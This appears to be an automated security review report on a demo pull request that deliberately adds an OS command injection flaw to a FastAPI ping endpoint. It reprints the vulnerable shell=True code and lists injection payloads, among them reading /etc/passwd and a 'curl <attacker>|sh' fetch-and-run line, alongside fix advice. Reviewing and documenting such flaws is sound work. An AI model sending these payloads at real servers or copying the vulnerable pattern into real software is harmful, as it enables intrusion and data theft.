# Security Review Findings — PR #3 (copaw-high-risk-human-reject)

**Reviewer**: p14h2-copaw-worker-reviewer
**Date**: 2026-08-30
**Repository**: nghqqa/fastapi-boilerplate-demo
**PR**: #3
**Branch**: demo/high-risk-human-reject
**Base**: mergepilot-demo/schema-migration-risk
**Head commit**: ad267a6

STATUS: HIGH_RISK_FOUND
SEVERITY: critical
HUMAN_VERIFICATION_REQUIRED: true

## Executive Summary

PR #3 introduces a new endpoint `demo_ping` that contains an intentionally
introduced **OS command injection (CWE-78)** vulnerability. The
`host` query parameter is interpolated into a shell command string that is
executed with `subprocess.run(..., shell=True, ...)`, so shell
metacharacters from user input execute arbitrary commands on the server with
the privileges of the process. Confirmed by inspection of the actual PR diff,
the live branch file, and the accompanying exploit-reproduction tests.

## Vulnerability Category

- **OS Command Injection (CWE-78)** — leading to **Arbitrary Command
  Execution / Remote Code Execution (RCE)** on the server.

## Affected File

- `backend/src/interfaces/api/v1/demo_cmd_exec.py`
  - Function: `demo_ping(host: str)`
  - Route: `GET /demo/ping` (no authentication shown in diff)

## Root Cause

```python
@router.get("/demo/ping", ...)
async def demo_ping(host: str) -> dict:
    command = f"ping -c 1 {host}"          # user input in shell string
    completed = subprocess.run(
        command, shell=True, capture_output=True, text=True, timeout=10
    )                                       # executed by the OS shell
    return {
        "command": command,
        "returncode": completed.returncode,
        "output": (completed.stdout + completed.stderr)[-2000:],
    }
```

- `host` is a **required, client-controlled** FastAPI query parameter.
- It is embedded via an f-string into `ping -c 1 {host}` with **no input
  validation, no allow-list, and no shell escaping**.
- `shell=True` hands the assembled string to the system shell (`/bin/sh`),
  which interprets metacharacters (`;`, `&&`, `||`, `$(...)`, backticks,
  newlines, etc.).
- The endpoint also returns the executed `command` string and (up to 2000
  chars of) combined output, giving the attacker visible feedback of their
  command execution.

## Impact

- **Arbitrary OS command execution with the privileges of the server
  process** (usually the application/service user), remotely and without
  authentication.
- An attacker can chain commands, e.g.
  `host=127.0.0.1; id` or `host=127.0.0.1$(cat /etc/passwd)` or
  `host=127.0.0.1; curl <attacker>|sh`, leading to:
  - data exfiltration (read `/etc/passwd`, env files, source code, secrets),
  - ransomware/tampering / file deletion,
  - spawning reverse shells (full RCE/C2),
  - lateral movement within the deployment environment.
- Because the output (last 2000 chars) is returned to the caller, the attack
  is easily scriptable and verifiable — a complete remote code execution /
  full system compromise primitive.

## Reproduction Steps

1. Deploy/run the FastAPI app and ensure the router is mounted (e.g. at
   `/demo/ping`).
2. Basic command chaining with a visible marker:
   ```
   GET /demo/ping?host=127.0.0.1; echo PWNED-DEMO-CMD-INJECTION-MARKER
   ```
   Observe `PWNED-DEMO-CMD-INJECTION-MARKER` in the returned `output`.
3. Command substitution:
   ```
   GET /demo/ping?host=127.0.0.1$(echo PWNED-DEMO-CMD-INJECTION-MARKER)
   ```
   Observe the marker in `output`, proving `$(...)` executes inside the ping
   command.
4. Real harm:
   ```
   GET /demo/ping?host=127.0.0.1; id
   GET /demo/ping?host=127.0.0.1; cat /etc/passwd
   ```
   Both return their results in the response `output`, confirming arbitrary
   command execution.

The accompanying test file reproduces the flaw:
- `test_ping_injects_shell_metacharacters` — `127.0.0.1; echo PWNED-DEMO-CMD-INJECTION-MARKER`
  asserts the marker appears in output.
- `test_ping_injects_command_substitution` — `127.0.0.1$(echo PWNED-DEMO-CMD-INJECTION-MARKER)`
  asserts the marker appears in output.

## Test Evidence (inspection of actual diff / code)

- Pulled PR diff: `https://github.com/nghqqa/fastapi-boilerplate-demo/pull/3.diff`
  — confirms new file `backend/src/interfaces/api/v1/demo_cmd_exec.py` with
  `command = f"ping -c 1 {host}"` and `subprocess.run(command, shell=True, ...)`.
- Pulled the live branch file from the repository:
  `raw.githubusercontent.com/nghqqa/fastapi-boilerplate-demo/demo/high-risk-human-reject/backend/src/interfaces/api/v1/demo_cmd_exec.py`
  — identical vulnerable code, confirming the diff is the committed state at
  head `ad267a6`.
- Pulled `backend/tests/unit/test_demo_cmd_exec_injection.py` from the diff —
  two tests explicitly reproduce the injection and assert the shell-execution
  marker / substitution marker appear in the output, proving the flaw is
  exploitable.
- The module docstring explicitly flags: "intentionally contains a HIGH-RISK
  OS command-injection vulnerability (CWE-78) in ``demo_ping`` ... shell
  metacharacters (``;``, ``&&``, ``$(...)``) execute arbitrary commands",
  corroborating the code inspection.

## Risk Statement

This endpoint provides unauthenticated remote command execution on the server
(CWE-78). If deployed in any real environment, the impact is **critical**:
full compromise, data exfiltration, and lateral movement. Even in this demo
scenario, the intentional flaw must be treated as real. Because this is the
high-risk **human-REJECT** scenario, no automatic remediation is authorized:
the human security reviewer is expected to REJECT remediation, keep PR #3
OPEN, and leave fix-1/verify-1 locked while the project remains
blocked/rejected.

## Fix Suggestion (for the record; not authorized for automatic application)

1. **Do not use `shell=True` at all.** Invoke `ping` directly with an
   argument list and no shell:
   ```python
   import shlex, subprocess
   subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True,
                  timeout=10)
   ```
2. **Validate `host` strictly** against an allow-list of IP literals /
   DNS names (e.g. regex `^[0-9a-zA-Z.-]+$`, reject anything else), or better,
   restrict to explicit single-host validation before constructing the argv.
3. **Prefer a safe parameterized API** that never concatenates user input
   into a command string.
4. Enforce minimum privilege for the service user and network egress controls
   as defense in depth.
5. After a **human security decision** approves remediation (not in this
   reject scenario), invert the reproduction tests to assert rejection/failure
   instead of successful execution.

DELIVERABLES:
- shared/projects/copaw-high-risk-human-reject/tasks/review-1/workspace/findings.md (this file)
